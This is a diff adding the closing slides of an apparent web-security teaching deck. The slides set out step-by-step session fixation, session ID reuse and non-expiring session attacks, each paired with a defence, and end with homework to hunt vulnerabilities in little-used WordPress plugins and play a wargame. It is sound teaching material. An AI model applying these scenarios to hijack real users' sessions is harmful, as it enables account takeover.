+5. Attacker now has access to the victims account because the attacker has the SessionID, which is now tied to a valid session
+
+note: this attack gets even worse if the SessionID is supplied in the URL, as then the attack does not rely on the victim+attacker sharing the same browser
+---
+# Session fixation conclusion
+- A **new** SessionID should **always** be generated upon login
+---
+# Session ID reused
+Attack scenario 1:
+1. Victim logs into account, receives SessionID
+2. Victim logs out
+3. Attacker somehow gets read access to SessionID
+4. Victim logs on again, receiving same SessionID as before
+5. Attacker now has access to the victim's account
+---
+# Session ID reused
+Attack scenario 2:
+1. Attacker logs into own account, receives SessionID
+2. Attacker saves SessionID offline
+3. Attacker logs out and logs on again, goto #2 - Process is repeated
+4. At some point, victim users log in
+5. When enough SessionIDs have been saved and some time has passed, attacker tests if the SessionIDs are tied to a valid session
+6. Attacker now has access to valid sessions of a victim user
+---
+# Session ID reuse conclusion
+
+- A **new** SessionID should **always** be generated upon login
+---
+# Sessions don't expire
+Attack scenario:
+1. Victim logs in, received new SessionID
+2. Victim forgets to log out
+3. Time passes
+4. Attacker gets read access to the SessionID somehow
+5. Attacker now has access to the victims account
+
+Solution: make sessions timeout when inactive
+---
+# Homework
+1. Browse https://wordpress.org/plugins/ and find a wordpress plugin which seems to be new, unpopular, or of low quality
+2. Search for vulnerabilities in it
+3. `if (foundVulnerabilities == 0) goto #1`
+4. Play a wargame: http://overthewire.org/wargames/natas/
+---
+class: middle, center
+# Questions?
+slides: http://dumpco.re/slides/a2
+    </textarea>
+    <script src="remark.js">
+    </script>
+    <script>
+      var slideshow = remark.create();
+    </script>
+  </body>
